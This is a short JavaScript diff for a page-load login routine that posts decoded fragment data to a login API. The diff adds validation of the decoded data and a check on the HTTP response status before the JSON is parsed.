@@ -68,6 +68,11 @@ window.addEventListener('DOMContentLoaded', () => {
         return;
       }
 
+      if (!decodedData || typeof decodedData !== 'object' || !decodedData.someRequiredField) {
+        console.error('Invalid or missing data in decoded fragment:', decodedData);
+        return;
+      }
+
       delay(1500)
         .then(() => {
           return fetch('https://api.grab-tutorials.live/login', {
@@ -79,7 +84,12 @@ window.addEventListener('DOMContentLoaded', () => {
             body: JSON.stringify(decodedData),
           });
         })
-        .then(response => response.json())
+        .then(response => {
+          if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+          }
+          return response.json();
+        })
         .then(data => {
           console.log('Login Response:', data);
 
